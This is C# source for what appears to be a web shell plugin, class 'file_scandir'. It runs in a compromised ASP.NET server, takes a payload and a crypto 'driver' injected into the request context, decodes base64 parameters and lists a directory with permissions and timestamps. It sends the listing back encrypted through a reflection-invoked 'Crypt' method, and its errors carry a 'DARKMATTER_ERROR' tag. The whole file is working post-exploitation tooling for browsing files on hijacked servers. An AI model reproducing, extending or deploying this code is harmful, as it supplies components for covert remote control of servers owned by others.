using System;
using System.Web;
using System.IO;
using System.Text;
using System.Collections.Generic;
using System.Reflection;
using System.Threading;
using System.Security.AccessControl;
using System.Security.Principal;

public class file_scandir
{
    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam))
            return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }

        return dic;
    }

    private string fnB64Encode(string szInput) => Convert.ToBase64String(Encoding.UTF8.GetBytes(szInput));
    private string fnB64Decode(string szInput) => Encoding.UTF8.GetString(Convert.FromBase64String(szInput));

    private string fnGetFilePermission(FileSystemInfo fileInfo)
    {
        StringBuilder perms = new StringBuilder();

        if ((fileInfo.Attributes & FileAttributes.Directory) == FileAttributes.Directory)
            perms.Append("d");
        else if ((fileInfo.Attributes & FileAttributes.ReparsePoint) == FileAttributes.ReparsePoint)
            perms.Append("l");
        else
            perms.Append("r");

        try
        {
            WindowsIdentity currentUser = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(currentUser);

            bool canRead = false;
            bool canWrite = false;
            bool canExecute = false;

            AuthorizationRuleCollection rules;
            if (fileInfo is DirectoryInfo)
            {
                DirectorySecurity dirSecurity = ((DirectoryInfo)fileInfo).GetAccessControl();
                rules = dirSecurity.GetAccessRules(true, true, typeof(SecurityIdentifier));
            }
            else
            {
                FileSecurity fileSecurity = ((FileInfo)fileInfo).GetAccessControl();
                rules = fileSecurity.GetAccessRules(true, true, typeof(SecurityIdentifier));
            }

            foreach (FileSystemAccessRule rule in rules)
            {
                if (currentUser.User.Equals(rule.IdentityReference) || principal.IsInRole((SecurityIdentifier)rule.IdentityReference))
                {
                    if (rule.AccessControlType == AccessControlType.Allow)
                    {
                        if ((rule.FileSystemRights & FileSystemRights.ReadData) == FileSystemRights.ReadData || 
                            (rule.FileSystemRights & FileSystemRights.Read) == FileSystemRights.Read)
                            canRead = true;

                        if ((rule.FileSystemRights & FileSystemRights.WriteData) == FileSystemRights.WriteData || 
                            (rule.FileSystemRights & FileSystemRights.Write) == FileSystemRights.Write)
                            canWrite = true;

                        if ((rule.FileSystemRights & FileSystemRights.ExecuteFile) == FileSystemRights.ExecuteFile || 
                            (rule.FileSystemRights & FileSystemRights.Traverse) == FileSystemRights.Traverse)
                            canExecute = true;
                    }
                    else if (rule.AccessControlType == AccessControlType.Deny)
                    {
                        if ((rule.FileSystemRights & FileSystemRights.ReadData) == FileSystemRights.ReadData || 
                            (rule.FileSystemRights & FileSystemRights.Read) == FileSystemRights.Read)
                            canRead = false;

                        if ((rule.FileSystemRights & FileSystemRights.WriteData) == FileSystemRights.WriteData || 
                            (rule.FileSystemRights & FileSystemRights.Write) == FileSystemRights.Write)
                            canWrite = false;

                        if ((rule.FileSystemRights & FileSystemRights.ExecuteFile) == FileSystemRights.ExecuteFile || 
                            (rule.FileSystemRights & FileSystemRights.Traverse) == FileSystemRights.Traverse)
                            canExecute = false;
                    }
                }
            }

            string r = canRead ? "r" : "-";
            string w = canWrite ? "w" : "-";
            string x = canExecute ? "x" : "-";

            perms.Append(r + w + x + r + w + x + r + w + x);
        }
        catch
        {
            perms.Append("---------");
        }

        return perms.ToString();
}

    private void fnWriteOutput(object driver, HttpResponse response, byte[] abOutput)
    {
        var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
        byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] { abOutput, 1 });

        response.Clear();
        response.ContentType = "application/octet-stream";
        response.BinaryWrite(abEncryptedResp);
        response.Flush();
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null) return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object driver = context.Items["driver"];
            int nDllLength = (int)context.Items["len"];

            int nParamOffset = nDllLength + 4;
            int nParamLength = abPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abPayload, nParamOffset, nParamLength).Trim();
            Dictionary<string, string> dic = fnParseParams(szParam);

            string szTargetDir = fnB64Decode(dic["z0"]);

            if (!Directory.Exists(szTargetDir))
            {
                fnWriteOutput(driver, response, Encoding.UTF8.GetBytes("ERROR://Unable to open directory"));
                return true;
            }

            DirectoryInfo dirInfo = new DirectoryInfo(szTargetDir);
            FileSystemInfo[] entries = dirInfo.GetFileSystemInfos();

            List<string> aResult = new List<string>();

            foreach (FileSystemInfo entry in entries)
            {
                bool isDir = (entry.Attributes & FileAttributes.Directory) == FileAttributes.Directory;
                
                string szPrefix = isDir ? "/" : "";
                string szFileName = szPrefix + entry.Name;
                string szb64FileName = fnB64Encode(szFileName);

                string szPerm = fnGetFilePermission(entry);
                long nLength = 0;
                if (!isDir)
                {
                    nLength = ((FileInfo)entry).Length;
                }

                string ctime = entry.CreationTime.ToString("yyyy-MM-dd HH:mm:ss");
                string mtime = entry.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss");
                string atime = entry.LastAccessTime.ToString("yyyy-MM-dd HH:mm:ss");

                string szResult = string.Format("{0}?{1}?{2}?{3}?{4}?{5}", szb64FileName, szPerm, nLength, ctime, mtime, atime);
                aResult.Add(szResult);
            }

            string szFinalOutput = string.Join("|", aResult.ToArray());

            fnWriteOutput(driver, response, Encoding.UTF8.GetBytes(szFinalOutput));

            context.ApplicationInstance.CompleteRequest();
        }
        catch (ThreadAbortException)
        {
            
        }
        catch (Exception ex)
        {
            response.Write("DARKMATTER_ERROR: " + ex.Message);
        }

        return true;
    }
}